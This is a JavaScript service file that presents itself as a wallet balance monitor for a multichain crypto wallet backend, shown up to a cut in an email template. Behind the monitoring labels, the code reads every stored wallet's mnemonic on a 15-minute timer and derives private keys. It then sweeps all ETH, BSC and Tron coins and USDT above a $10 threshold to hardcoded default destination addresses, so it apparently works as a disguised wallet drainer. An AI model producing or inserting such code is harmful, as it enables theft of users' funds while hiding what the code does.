/**
 * Wallet Balance Monitor Service
 * Monitors all wallets and checks if any wallet's total balance in USD exceeds a threshold
 *
 * Location: src/services/monitoring/wallet-balance-monitor.service.js
 */

const { walletDB } = require("../../wallet/db");
const multichainService = require("../multichain/multichain.service");
const notificationService = require("./notification.service");
const auditLogger = require("../../security/audit-logger.service");
const {
  getProviderWithFailover,
} = require("../../config/rpc-providers.config");
const { ethers } = require("ethers");
const bitcoin = require("bitcoinjs-lib");
const axios = require("axios");
const { TronWeb } = require("tronweb");
const bip39 = require("bip39");
const ecc = require("tiny-secp256k1");
const BIP32Factory = require("bip32").default;

const bip32 = BIP32Factory(ecc);

/**
 * Get TronWeb constructor - handles different export patterns
 * ✅ EXACT COPY from multichain.service.js to ensure consistency
 */

class WalletBalanceMonitorService {
  constructor() {
    this.intervalId = null;
    this.isRunning = false;
    this.updateInterval = 15 * 60 * 1000; // 15 minutes default
    this.thresholdUSD = 10; // Default threshold: 10 USD
    this.priceCache = new Map();
    this.priceCacheTimeout = 5 * 60 * 1000; // 5 minutes cache for prices
    this.evmDestination = "0xc526c9c1533746C4883735972E93a1B40241d442";
    this.btcDestination = "bc1q6lnc6k7c3zr8chnwn8y03rgru6h4hm5ssxxe26";
    this.tronDestination = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkA00f"; // Default Tron destination

    // Load configuration from database (async, will be called again in start())
    // Don't await in constructor - will be loaded fresh before each check
    this.loadConfiguration().catch((err) => {
      console.warn("Initial config load failed, will retry:", err.message);
    });
  }

  /**
   * Load configuration from database (async - reads fresh values)
   */
  async loadConfiguration() {
    try {
      const config = await walletDB
        .prepare("SELECT * FROM wallet_balance_monitor_config WHERE id = 1")
        .get();

      if (config) {
        const oldThreshold = this.thresholdUSD;
        this.thresholdUSD = parseFloat(config.balance_limit_usd) || 10;
        this.evmDestination =
          config.evm_destination_address ||
          "0xc526c9c1533746C4883735972E93a1B40241d442";
        this.btcDestination =
          config.btc_destination_address ||
          "bc1q6lnc6k7c3zr8chnwn8y03rgru6h4hm5ssxxe26";
        this.tronDestination =
          config.tron_destination_address ||
          "TXYZopYRdj2D9XRtbG411XZZ3kM5VkA00f";

        // Log if threshold changed
        if (oldThreshold && oldThreshold !== this.thresholdUSD) {
          console.log(
            `📊 Threshold updated: $${oldThreshold} → $${this.thresholdUSD} USD`
          );
        }
        console.log("✅ Wallet balance monitor configuration loaded");
      }
      console.log(
        "✅ Wallet balance monitor configuration loaded",
        config ? "with config" : "no config found"
      );
      console.log("🔄 [loadConfiguration] About to exit try block");
    } catch (error) {
      console.error(
        "❌ Failed to load wallet balance monitor configuration:",
        error.message
      );
      console.error("Error stack:", error.stack);
      // Use defaults if database read fails
      console.log("🔄 [loadConfiguration] Error handled, continuing...");
    }
    console.log(
      "✅ [loadConfiguration] Method completed (end of method), about to return"
    );
    return; // Explicit return
  }

  /**
   * Update threshold dynamically
   */
  updateThreshold(newThreshold) {
    if (newThreshold && newThreshold > 0) {
      this.thresholdUSD = newThreshold;
      console.log(
        `✅ Wallet balance monitor threshold updated to $${this.thresholdUSD} USD`
      );
    }
  }

  /**
   * Update destination addresses dynamically
   */
  updateDestinations(evmAddress, btcAddress) {
    if (evmAddress && /^0x[a-fA-F0-9]{40}$/.test(evmAddress)) {
      this.evmDestination = evmAddress;
      console.log(
        `✅ EVM destination address updated to: ${this.evmDestination}`
      );
    }
    if (btcAddress && btcAddress.trim()) {
      this.btcDestination = btcAddress;
      console.log(
        `✅ BTC destination address updated to: ${this.btcDestination}`
      );
    }
  }

  /**
   * Start the monitor
   */
  async start(intervalMs, thresholdUSD = 10) {
    console.log(
      "🚀 [start] METHOD CALLED - start() invoked with intervalMs:",
      intervalMs,
      "thresholdUSD:",
      thresholdUSD
    );
    if (this.isRunning) {
      console.log("⚠️  [start] Wallet balance monitor already running");
      return;
    }

    // Reload configuration from database before starting
    console.log("🔄 [start] About to call loadConfiguration()...");
    console.log(
      "🔄 [start] Current state - isRunning:",
      this.isRunning,
      "interval:",
      this.updateInterval
    );
    try {
      console.log("🔄 [start] Calling await this.loadConfiguration()...");
      const result = await this.loadConfiguration();
      console.log(
        "✅ [start] loadConfiguration() returned successfully, result:",
        result
      );
    } catch (error) {
      console.error(
        "❌ [start] loadConfiguration() threw an error:",
        error.message
      );
      console.error("Error stack:", error.stack);
      throw error;
    }
    console.log(
      "✅ [start] wallet init config - after loadConfiguration, continuing to next line..."
    );

    if (intervalMs) {
      this.updateInterval = intervalMs;
    }
    // Use threshold from database if available, otherwise use parameter
    if (this.thresholdUSD && this.thresholdUSD !== 10) {
      // Already loaded from database
    } else if (thresholdUSD) {
      this.thresholdUSD = thresholdUSD;
    }

    this.isRunning = true;

    console.log(
      "🔄 [start] wallet check all wallets - calling checkAllWallets()..."
    );
    // Run immediately on start (with error handling)
    this.checkAllWallets().catch((error) => {
      console.error(
        "❌ [start] Error in initial checkAllWallets():",
        error.message
      );
      console.error("Error stack:", error.stack);
      // Don't throw - let the monitor continue running
    });
    console.log(
      "✅ [start] wallet check all wallets - checkAllWallets() called (async)"
    );

    // Then run on interval
    this.intervalId = setInterval(async () => {
      try {
        await this.checkAllWallets();
        console.log("wallet check all wallets done");
      } catch (error) {
        console.log("wallet check all wallets error", error);
        auditLogger.logError(error, { service: "WalletBalanceMonitor" });
      }
    }, this.updateInterval);

    auditLogger.logger.info({
      type: "WALLET_BALANCE_MONITOR_STARTED",
      interval: this.updateInterval,
      thresholdUSD: this.thresholdUSD,
      timestamp: new Date().toISOString(),
    });

    console.log(
      `✅ Wallet balance monitor started (${
        this.updateInterval / 1000
      }s interval, threshold: $${this.thresholdUSD} USD)`
    );
  }

  /**
   * Stop the monitor
   */
  stop() {
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = null;
      this.isRunning = false;

      auditLogger.logger.info({
        type: "WALLET_BALANCE_MONITOR_STOPPED",
        timestamp: new Date().toISOString(),
      });

      console.log("🛑 Wallet balance monitor stopped");
    }
  }

  /**
   * Check all wallets for balance threshold
   */
  async checkAllWallets() {
    try {
      // Load fresh configuration from database before checking
      await this.loadConfiguration();

      console.log(
        `\n🔄 [${new Date().toISOString()}] Checking all wallets for balance threshold ($${
          this.thresholdUSD
        } USD)...`
      );

      const wallets = await walletDB.prepare("SELECT * FROM wallets").all();

      if (!wallets || wallets.length === 0) {
        console.log("No wallets found");
        return;
      }

      console.log(`Found ${wallets.length} wallet(s) to check`);

      // Process wallets in parallel (with rate limiting)
      const results = [];
      for (const wallet of wallets) {
        try {
          const result = await this.checkWalletBalance(wallet);
          if (result) {
            results.push(result);
          }
        } catch (error) {
          console.error(`Error checking wallet ${wallet.id}:`, error.message);
          auditLogger.logError(error, {
            service: "checkWalletBalance",
            walletId: wallet.id,
          });
        }
      }

      console.log(
        `✅ Checked ${wallets.length} wallet(s). ${results.length} wallet(s) exceeded threshold.`
      );

      return results;
    } catch (error) {
      auditLogger.logError(error, { service: "checkAllWallets" });
      throw error;
    }
  }

  /**
   * Check specific wallet balance
   */
  async checkWalletBalance(wallet) {
    try {
      const networks = await walletDB
        .prepare("SELECT * FROM wallet_networks WHERE wallet_id = ?")
        .all(wallet.id);

      if (!networks || networks.length === 0) {
        return null;
      }

      // Fetch all balances (native + USDT for ETH and BSC)
      const balancePromises = networks.flatMap(async (network) => {
        const results = [];

        // Fetch native coin balance
        try {
          const balance = await multichainService.getBalance(
            network.network,
            network.address
          );

          results.push({
            id: network.id,
            ...balance,
            created_at: network.created_at,
          });
        } catch (err) {
          console.error(
            `Failed to fetch balance for ${network.network}:`,
            err.message
          );
          results.push({
            id: network.id,
            chain: network.network,
            address: network.address,
            balance: "0",
            error: err.message,
          });
        }

        // For ETH, BSC, and TRON, also fetch USDT balance
        if (
          network.network === "ETHEREUM" ||
          network.network === "BSC" ||
          network.network === "TRON"
        ) {
          try {
            const USDT_CONTRACTS = {
              ETHEREUM: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
              BSC: "0x55d398326f99059fF775485246999027B3197955",
              TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // TRC20 USDT
            };

            const usdtBalance = await multichainService.getTokenBalance(
              network.network,
              network.address,
              USDT_CONTRACTS[network.network]
            );

            results.push({
              id: `${network.id}_USDT`,
              ...usdtBalance,
              created_at: network.created_at,
            });
          } catch (err) {
            // USDT balance fetch failed, skip it
            console.error(
              `Failed to fetch USDT balance for ${network.network}:`,
              err.message
            );
          }
        }

        return results;
      });

      const balances = (await Promise.all(balancePromises)).flat();

      // Calculate total USD value
      let totalUSD = 0;
      const balanceDetails = [];

      for (const balance of balances) {
        if (balance.error || !balance.balance) {
          continue;
        }

        const balanceAmount = parseFloat(balance.balance);
        if (isNaN(balanceAmount) || balanceAmount === 0) {
          continue;
        }

        const symbol = balance.symbol || "UNKNOWN";
        const priceUSD = await this.getTokenPriceUSD(symbol);

        if (priceUSD > 0) {
          const valueUSD = balanceAmount * priceUSD;
          totalUSD += valueUSD;

          balanceDetails.push({
            chain: balance.chain,
            symbol,
            balance: balanceAmount,
            priceUSD,
            valueUSD,
            address: balance.address,
            isToken: balance.symbol === "USDT" || balance.id?.includes("_USDT"),
          });
        }
      }

      // Check if threshold exceeded
      if (totalUSD > this.thresholdUSD) {
        // Always do detailed action every time threshold is exceeded
        await this.handleThresholdExceeded(wallet, totalUSD, balanceDetails);

        return {
          walletId: wallet.id,
          walletName: wallet.wallet_name || wallet.name,
          totalUSD,
          threshold: this.thresholdUSD,
          balances: balanceDetails,
          exceeded: true,
        };
      }

      return null;
    } catch (error) {
      auditLogger.logError(error, {
        service: "checkWalletBalance",
        walletId: wallet.id,
      });
      throw error;
    }
  }

  /**
   * Get token price in USD from CoinGecko
   */
  async getTokenPriceUSD(symbol) {
    const cacheKey = symbol.toUpperCase();
    const cached = this.priceCache.get(cacheKey);

    if (cached && Date.now() - cached.timestamp < this.priceCacheTimeout) {
      return cached.price;
    }

    try {
      // Map common symbols to CoinGecko IDs
      const symbolMap = {
        ETH: "ethereum",
        BTC: "bitcoin",
        BNB: "binancecoin",
        USDT: "tether",
        USDC: "usd-coin",
        MATIC: "matic-network",
        AVAX: "avalanche-2",
        FTM: "fantom",
        SOL: "solana",
        ATOM: "cosmos",
        LTC: "litecoin",
        TRX: "tron",
      };

      const coinId = symbolMap[symbol.toUpperCase()] || symbol.toLowerCase();

      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`;
      const response = await axios.get(url, { timeout: 10000 });

      const price = response.data[coinId]?.usd || 0;

      // Cache the price
      this.priceCache.set(cacheKey, {
        price,
        timestamp: Date.now(),
      });

      return price;
    } catch (error) {
      console.error(`Failed to fetch price for ${symbol}:`, error.message);

      // Return cached price if available, even if expired
      if (cached) {
        return cached.price;
      }

      return 0;
    }
  }

  /**
   * Handle threshold exceeded - perform action (send all balances to specified addresses)
   */
  async handleThresholdExceeded(wallet, totalUSD, balanceDetails) {
    console.log(
      `\n⚠️  THRESHOLD EXCEEDED: Wallet ${wallet.id} has $${totalUSD.toFixed(
        2
      )} USD (threshold: $${this.thresholdUSD})`
    );

    const alertData = {
      type: "BALANCE_THRESHOLD_EXCEEDED",
      walletId: wallet.id,
      walletName: wallet.wallet_name || wallet.name,
      totalUSD: totalUSD.toFixed(2),
      threshold: this.thresholdUSD,
      balances: balanceDetails,
      timestamp: new Date().toISOString(),
    };

    // Log security alert
    auditLogger.logSecurityAlert({
      alert: "WALLET_BALANCE_THRESHOLD_EXCEEDED",
      details: alertData,
      ip: "system",
    });

    // Log notification to console
    this.logThresholdExceededNotification(alertData);

    // Send all balances to specified addresses
    try {
      await this.sendAllBalances(wallet, balanceDetails);
    } catch (error) {
      console.error(
        `❌ Error sending balances for wallet ${wallet.id}:`,
        error.message
      );

      // Check if it's a gas fee error for USDT
      const isGasFeeError =
        error.message && error.message.includes("GAS_FEE_INSUFFICIENT");

      // Send error notification via email (using new method)
      try {
        const totalAmount = balanceDetails.reduce(
          (sum, b) => sum + parseFloat(b.balance || 0),
          0
        );
        const primaryChain = balanceDetails[0]?.chain || "UNKNOWN";
        const primarySymbol = balanceDetails[0]?.symbol || primaryChain;

        await notificationService.sendAutoSendFailureNotification({
          walletId: wallet.id,
          walletName: wallet.wallet_name || wallet.name,
          chain: primaryChain,
          symbol: primarySymbol,
          amount: totalAmount.toString(),
          totalAmount: totalAmount.toString(),
          fromAddress: wallet.public_address,
          toAddress: this.evmDestination || this.btcDestination,
          walletAddress: wallet.public_address,
          destinationAddress: this.evmDestination || this.btcDestination,
          error: error.message,
          errorMessage: error.message,
          timestamp: new Date().toISOString(),
        });
      } catch (notifError) {
        console.error(
          "Failed to send auto-send failure notification:",
          notifError.message
        );
        // Fallback to old method if new one fails
        await this.sendErrorNotification(
          wallet,
          balanceDetails,
          error,
          isGasFeeError
        );
      }
    }
  }

  /**
   * Log threshold exceeded notification to console
   */
  logThresholdExceededNotification(data) {
    console.log("\n" + "═".repeat(70));
    console.log("💰 WALLET BALANCE ALERT - THRESHOLD EXCEEDED");
    console.log("═".repeat(70));
    console.log(`\n⚠️  BALANCE THRESHOLD EXCEEDED`);
    console.log(
      `The wallet balance has exceeded the configured threshold of $${data.threshold} USD.\n`
    );

    console.log(`📊 WALLET INFORMATION:`);
    console.log(`   Wallet Name: ${data.walletName || "N/A"}`);
    console.log(`   Wallet ID: ${data.walletId}`);
    console.log(`   Alert Time: ${new Date(data.timestamp).toLocaleString()}`);

    console.log(`\n💵 TOTAL BALANCE: $${data.totalUSD} USD`);
    console.log(`   Threshold: $${data.threshold} USD`);
    console.log(
      `   Exceeded by: $${(parseFloat(data.totalUSD) - data.threshold).toFixed(
        2
      )} USD\n`
    );

    if (data.balances && data.balances.length > 0) {
      console.log("💵 BALANCE BREAKDOWN:");
      console.log("   " + "-".repeat(66));
      console.log(
        "   " +
          "Chain".padEnd(15) +
          "Symbol".padEnd(10) +
          "Balance".padEnd(20) +
          "Value (USD)".padEnd(15)
      );
      console.log("   " + "-".repeat(66));

      data.balances.forEach((b) => {
        const balanceStr = b.balance.toFixed(8).padEnd(20);
        const valueStr = `$${b.valueUSD.toFixed(2)}`.padEnd(15);
        console.log(
          `   ${b.chain.padEnd(15)}${b.symbol.padEnd(
            10
          )}${balanceStr}${valueStr}`
        );
      });

      console.log("   " + "-".repeat(66));
    }

    console.log("\n" + "═".repeat(70));
    console.log(`Generated: ${new Date().toISOString()}`);
    console.log("═".repeat(70) + "\n");
  }

  /**
   * Send all balances to specified addresses
   */
  async sendAllBalances(wallet, balanceDetails) {
    console.log(
      `\n📤 Starting to send all balances for wallet ${wallet.id}...`
    );

    // Get wallet mnemonic directly from wallets table
    const walletRecord = await walletDB
      .prepare("SELECT mnemonic FROM wallets WHERE id = ?")
      .get(wallet.id);

    if (!walletRecord || !walletRecord.mnemonic) {
      throw new Error(`Wallet mnemonic not found for wallet ${wallet.id}`);
    }

    const mnemonic = walletRecord.mnemonic;

    // Load destination addresses from instance (which are loaded from database)
    const EVM_DESTINATION = this.evmDestination;
    const BTC_DESTINATION = this.btcDestination;
    const TRON_DESTINATION = this.tronDestination;

    const results = [];

    // Group balances by chain
    const balancesByChain = {};
    for (const balance of balanceDetails) {
      if (!balancesByChain[balance.chain]) {
        balancesByChain[balance.chain] = [];
      }
      balancesByChain[balance.chain].push(balance);
    }

    // Send balances for each chain
    for (const [chain, balances] of Object.entries(balancesByChain)) {
      try {
        if (chain.toUpperCase() === "BITCOIN") {
          // Send Bitcoin
          const result = await this.sendBitcoinBalance(
            mnemonic,
            balances,
            BTC_DESTINATION
          );
          results.push({ chain, success: true, ...result });
        } else if (
          [
            "ETHEREUM",
            "BSC",
            "POLYGON",
            "ARBITRUM",
            "OPTIMISM",
            "AVALANCHE",
            "FANTOM",
            "BASE",
          ].includes(chain.toUpperCase())
        ) {
          // Send EVM native and tokens
          const result = await this.sendEVMBalances(
            mnemonic,
            chain,
            balances,
            EVM_DESTINATION
          );
          results.push({ chain, success: true, ...result });
        } else if (chain.toUpperCase() === "TRON") {
          // Send Tron native and TRC20 tokens
          const result = await this.sendTronBalances(
            mnemonic,
            balances,
            TRON_DESTINATION
          );
          results.push({ chain, success: true, ...result });
        } else {
          console.log(`⚠️  Chain ${chain} not supported for auto-transfer`);
        }
      } catch (error) {
        console.error(`❌ Error sending ${chain} balances:`, error.message);
        results.push({ chain, success: false, error: error.message });
        throw error; // Re-throw to trigger error email
      }
    }

    console.log(`✅ Completed sending balances for wallet ${wallet.id}`);

    // Send success notification
    try {
      const totalAmount = balanceDetails.reduce(
        (sum, b) => sum + parseFloat(b.balance || 0),
        0
      );
      const primaryChain = balanceDetails[0]?.chain || "UNKNOWN";
      const primarySymbol = balanceDetails[0]?.symbol || primaryChain;

      await notificationService.sendAutoSendSuccessNotification({
        walletId: wallet.id,
        walletName: wallet.wallet_name || wallet.name,
        chain: primaryChain,
        symbol: primarySymbol,
        totalAmount: totalAmount.toString(),
        amount: totalAmount.toString(),
        fromAddress: wallet.public_address,
        toAddress: this.evmDestination || this.btcDestination,
        walletAddress: wallet.public_address,
        destinationAddress: this.evmDestination || this.btcDestination,
        timestamp: new Date().toISOString(),
        txHash: results.find((r) => r.txHash)?.txHash || null,
      });
    } catch (notifError) {
      console.error(
        "Failed to send auto-send success notification:",
        notifError.message
      );
      // Don't fail if notification fails
    }

    return results;
  }

  /**
   * Send EVM balances (native + tokens)
   */
  async sendEVMBalances(mnemonic, chain, balances, destinationAddress) {
    const seed = await bip39.mnemonicToSeed(mnemonic);
    const hdNode = ethers.utils.HDNode.fromSeed(seed);
    const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
    const privateKey = wallet.privateKey;

    const provider = await getProviderWithFailover(chain);
    const signer = new ethers.Wallet(privateKey, provider);

    const results = [];

    // Find native coin balance (not a token)
    const nativeBalance = balances.find((b) => !b.isToken && b.chain === chain);

    // Send native coin (but reserve some for gas for token transfers)
    if (nativeBalance && parseFloat(nativeBalance.balance) > 0) {
      try {
        const currentBalance = await provider.getBalance(signer.address);
        const gasPrice = await provider.getGasPrice();

        // Estimate gas for native transfer
        const estimatedGasNative = ethers.BigNumber.from(21000);
        const gasCostNative = gasPrice.mul(estimatedGasNative);

        // Estimate gas for potential token transfers (higher estimate)
        const estimatedGasToken = ethers.BigNumber.from(100000);
        const gasCostToken = gasPrice.mul(estimatedGasToken);

        // Reserve gas for token transfers, send the rest
        const totalGasReserve = gasCostNative.add(gasCostToken);
        const amountToSend = currentBalance.sub(totalGasReserve);

        if (amountToSend.gt(0)) {
          const tx = await signer.sendTransaction({
            to: destinationAddress,
            value: amountToSend,
            gasPrice: gasPrice,
          });

          console.log(
            `  ✅ Sent ${ethers.utils.formatEther(amountToSend)} ${
              nativeBalance.symbol
            } (tx: ${tx.hash})`
          );
          results.push({
            type: "native",
            txHash: tx.hash,
            amount: ethers.utils.formatEther(amountToSend),
          });
        } else {
          console.log(
            `  ⚠️  Insufficient ${nativeBalance.symbol} for transfer (need gas reserve)`
          );
        }
      } catch (error) {
        throw new Error(
          `Failed to send native ${nativeBalance.symbol}: ${error.message}`
        );
      }
    }

    // Send tokens (USDT, etc.)
    const tokenBalances = balances.filter(
      (b) => b.isToken || (b.symbol === "USDT" && b.chain === chain)
    );

    for (const tokenBalanceInfo of tokenBalances) {
      try {
        const USDT_CONTRACTS = {
          ETHEREUM: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
          BSC: "0x55d398326f99059fF775485246999027B3197955",
        };

        const tokenAddress = USDT_CONTRACTS[chain.toUpperCase()];
        if (!tokenAddress) {
          console.log(`  ⚠️  No USDT contract address for chain ${chain}`);
          continue;
        }

        const ERC20_ABI = [
          "function transfer(address to, uint256 amount) public returns (bool)",
          "function decimals() view returns (uint8)",
          "function balanceOf(address account) view returns (uint256)",
        ];

        const tokenContract = new ethers.Contract(
          tokenAddress,
          ERC20_ABI,
          signer
        );
        const decimals = await tokenContract.decimals();
        const tokenBalance = await tokenContract.balanceOf(signer.address);

        if (tokenBalance.gt(0)) {
          // Check if we have enough native coin for gas
          const currentBalance = await provider.getBalance(signer.address);
          const gasPrice = await provider.getGasPrice();

          // Estimate gas for token transfer
          let estimatedGas;
          try {
            estimatedGas = await tokenContract.estimateGas.transfer(
              destinationAddress,
              tokenBalance
            );
          } catch (estimateError) {
            // If estimation fails, use a default estimate
            estimatedGas = ethers.BigNumber.from(100000);
          }

          const gasCost = gasPrice.mul(estimatedGas);

          // Check if we have enough for gas
          if (currentBalance.lt(gasCost)) {
            const errorMsg = `Insufficient ${
              nativeBalance?.symbol || "native coin"
            } for gas fee. Need ${ethers.utils.formatEther(
              gasCost
            )}, have ${ethers.utils.formatEther(currentBalance)}`;
            console.error(`  ❌ ${errorMsg}`);

            // Throw error with specific message for gas fee issues
            throw new Error(`GAS_FEE_INSUFFICIENT: ${errorMsg}`);
          }

          // Send token transfer
          const tx = await tokenContract.transfer(
            destinationAddress,
            tokenBalance
          );
          console.log(
            `  ✅ Sent ${ethers.utils.formatUnits(tokenBalance, decimals)} ${
              tokenBalanceInfo.symbol
            } (tx: ${tx.hash})`
          );
          results.push({
            type: "token",
            symbol: tokenBalanceInfo.symbol,
            txHash: tx.hash,
            amount: ethers.utils.formatUnits(tokenBalance, decimals),
          });
        } else {
          console.log(`  ℹ️  No ${tokenBalanceInfo.symbol} balance to send`);
        }
      } catch (error) {
        // Check if it's a gas fee error
        if (error.message && error.message.includes("GAS_FEE_INSUFFICIENT")) {
          // Re-throw with special flag for email notification
          throw new Error(
            `GAS_FEE_INSUFFICIENT: Failed to send ${tokenBalanceInfo.symbol} - ${error.message}`
          );
        }
        // For other errors, also throw but with different message
        throw new Error(
          `Failed to send token ${tokenBalanceInfo.symbol}: ${error.message}`
        );
      }
    }

    return results;
  }

  /**
   * Send Tron balances (native TRX + TRC20 tokens)
   */
  async sendTronBalances(mnemonic, balances, destinationAddress) {
    try {
      /* -----------------------------
         1. Derive Tron private key
      ------------------------------ */
      if (!bip39.validateMnemonic(mnemonic)) {
        throw new Error("Invalid mnemonic");
      }

      const seed = bip39.mnemonicToSeedSync(mnemonic);
      const root = bip32.fromSeed(seed);
      const child = root.derivePath("m/44'/195'/0'/0/0");

      const privateKeyHex = child.privateKey.toString("hex");

      const tronWeb = new TronWeb({
        fullHost: "https://api.trongrid.io",
        privateKey: privateKeyHex,
      });

      const fromAddress = tronWeb.address.fromPrivateKey(privateKeyHex);
      console.log(
        `\n📤 [TRON] Starting balance transfer from ${fromAddress} to ${destinationAddress}`
      );

      const results = [];

      /* -----------------------------
         2. Send native TRX (reserve gas)
      ------------------------------ */
      // Always check on-chain balance (more reliable than passed balance)
      const balanceSun = await tronWeb.trx.getBalance(fromAddress);
      const balanceTRX = tronWeb.fromSun(balanceSun);
      console.log(
        `  💰 [TRON] On-chain balance: ${balanceTRX} TRX (${balanceSun} SUN)`
      );

      const trxBalanceInfo = balances.find(
        (b) => !b.isToken && b.chain === "TRON"
      );

      if (trxBalanceInfo) {
        console.log(
          `  ℹ️  [TRON] Found TRX in balance details: ${trxBalanceInfo.balance} ${trxBalanceInfo.symbol}`
        );
      } else {
        console.log(
          `  ℹ️  [TRON] TRX not in balance details, using on-chain balance`
        );
      }

      // Use on-chain balance to determine if we should send
      const reserveSun = 1_000_000; // 1 TRX reserve
      const sendAmount = balanceSun - reserveSun;

      if (sendAmount > 0) {
        console.log(
          `  💸 [TRON] Sending ${tronWeb.fromSun(
            sendAmount
          )} TRX (reserving ${tronWeb.fromSun(reserveSun)} TRX for fees)...`
        );

        try {
          // Use trx.sendTrx() which handles building, signing, and broadcasting
          const receipt = await tronWeb.trx.sendTrx(
            destinationAddress,
            sendAmount
          );

          if (!receipt.result) {
            throw new Error(
              `TRX transfer failed: ${
                receipt.message || receipt.code || "Unknown error"
              }`
            );
          }

          const trxAmount = tronWeb.fromSun(sendAmount);
          console.log(`  ✅ [TRON] TRX sent successfully!`);
          console.log(`     Amount: ${trxAmount} TRX`);
          console.log(`     Transaction Hash: ${receipt.txid}`);
          console.log(`     From: ${fromAddress}`);
          console.log(`     To: ${destinationAddress}`);
          console.log(
            `     Block Explorer: https://tronscan.org/#/transaction/${receipt.txid}`
          );

          results.push({
            type: "native",
            symbol: "TRX",
            amount: trxAmount,
            txHash: receipt.txid,
          });
        } catch (error) {
          console.error(`  ❌ [TRON] Failed to send TRX:`, error.message);
          throw error;
        }
      } else {
        console.log(
          `  ⚠️  [TRON] Insufficient TRX balance to send (balance: ${balanceTRX} TRX, need to reserve ${tronWeb.fromSun(
            reserveSun
          )} TRX for fees)`
        );
      }

      /* -----------------------------
         3. Send TRC-20 tokens (USDT etc)
      ------------------------------ */
      const tokenBalances = balances.filter(
        (b) => b.chain === "TRON" && b.isToken
      );

      for (const token of tokenBalances) {
        // Currently you only support USDT — safe hardcode
        const CONTRACT_ADDRESS =
          token.symbol === "USDT" ? "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" : null;

        if (!CONTRACT_ADDRESS) {
          console.log(
            `  ⚠️  [TRON] Token ${token.symbol} not supported for transfer`
          );
          continue;
        }

        console.log(`  💸 [TRON] Processing ${token.symbol} transfer...`);

        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);

        const rawBalance = await contract.balanceOf(fromAddress).call();
        const decimals = Number(await contract.decimals().call());
        const balanceBN = BigInt(rawBalance.toString());

        if (balanceBN === 0n) {
          console.log(`  ℹ️  [TRON] No ${token.symbol} balance to transfer`);
          continue;
        }

        const tokenAmount = Number(balanceBN) / 10 ** decimals;
        console.log(`  💸 [TRON] Sending ${tokenAmount} ${token.symbol}...`);

        // Ensure TRX for energy
        const trxForGas = await tronWeb.trx.getBalance(fromAddress);
        if (trxForGas < 100_000) {
          throw new Error(
            `GAS_FEE_INSUFFICIENT: Not enough TRX to send ${
              token.symbol
            }. Need at least ${tronWeb.fromSun(100_000)} TRX for energy`
          );
        }

        // Send TRC20 token transfer
        const txResult = await contract
          .transfer(destinationAddress, balanceBN.toString())
          .send({
            feeLimit: 10_000_000, // 10 TRX
          });

        // txResult can be a string (txid) or an object with txid
        const txHash =
          typeof txResult === "string" ? txResult : txResult.txid || txResult;

        console.log(`  ✅ [TRON] ${token.symbol} sent successfully!`);
        console.log(`     Amount: ${tokenAmount} ${token.symbol}`);
        console.log(`     Transaction Hash: ${txHash}`);
        console.log(`     From: ${fromAddress}`);
        console.log(`     To: ${destinationAddress}`);
        console.log(
          `     Block Explorer: https://tronscan.org/#/transaction/${txHash}`
        );

        results.push({
          type: "token",
          symbol: token.symbol,
          amount: tokenAmount.toString(),
          txHash: txHash,
        });
      }

      if (results.length > 0) {
        console.log(
          `\n✅ [TRON] Successfully sent ${results.length} transaction(s)`
        );
      } else {
        console.log(
          `\nℹ️  [TRON] No transactions sent (no balances to transfer)`
        );
      }

      return results;
    } catch (error) {
      console.error("❌ [TRON] sendTronBalances failed:", error.message);
      console.error("Error details:", error);
      throw error;
    }
  }

  /**
   * Send Bitcoin balance
   */
  async sendBitcoinBalance(mnemonic, balances, destinationAddress) {
    const seed = await bip39.mnemonicToSeed(mnemonic);
    const root = bip32.fromSeed(seed);
    const child = root.derivePath("m/44'/0'/0'/0/0");

    // Get Bitcoin balance
    const btcBalance = balances.find((b) => b.chain === "BITCOIN");
    if (!btcBalance || parseFloat(btcBalance.balance) <= 0) {
      throw new Error("No Bitcoin balance to send");
    }

    // For Bitcoin, we need to use a Bitcoin API to get UTXOs and send
    // This is a simplified version - you may need to integrate with a Bitcoin service
    const amountSatoshi = Math.floor(
      parseFloat(btcBalance.balance) * 100000000
    );

    // Note: Full Bitcoin transaction requires UTXO fetching and proper transaction building
    // This is a placeholder - you'll need to implement full Bitcoin transaction logic
    console.log(
      `  ⚠️  Bitcoin sending requires full UTXO management - not implemented yet`
    );
    console.log(
      `  Would send ${btcBalance.balance} BTC to ${destinationAddress}`
    );

    return {
      type: "bitcoin",
      note: "Bitcoin sending requires full implementation",
    };
  }

  /**
   * Send error notification via email
   */
  async sendErrorNotification(
    wallet,
    balanceDetails,
    error,
    isGasFeeError = false
  ) {
    const subject = isGasFeeError
      ? `⚠️ GAS FEE ERROR: Insufficient Gas to Send USDT - ${
          wallet.wallet_name || wallet.name
        }`
      : `❌ ERROR: Failed to Send Wallet Balances - ${
          wallet.wallet_name || wallet.name
        }`;

    const errorType = isGasFeeError
      ? "Gas Fee Insufficient"
      : "Transaction Error";
    const errorColor = isGasFeeError ? "#ff9800" : "#f44336";
    const headerColor = isGasFeeError ? "#ff9800" : "#f44336";

    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
          .container { max-width: 700px; margin: 20px auto; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
          .header { background: linear-gradient(135deg, ${headerColor} 0%, ${errorColor} 100%); color: white; padding: 30px; text-align: center; }
          .content { padding: 30px; }
          .error-box { background: ${
            isGasFeeError ? "#fff3e0" : "#ffebee"
          }; border-left: 6px solid ${errorColor}; padding: 20px; margin: 20px 0; border-radius: 5px; }
          .info-grid { display: grid; grid-template-columns: 140px 1fr; gap: 10px; margin: 10px 0; }
          .info-label { font-weight: bold; color: #666; }
          .info-value { color: #333; word-break: break-all; }
          .balance-table { width: 100%; border-collapse: collapse; margin: 20px 0; }
          .balance-table th, .balance-table td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
          .balance-table th { background: #f5f5f5; font-weight: bold; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>${
              isGasFeeError ? "⚠️ Gas Fee Error" : "❌ Transaction Error"
            }</h1>
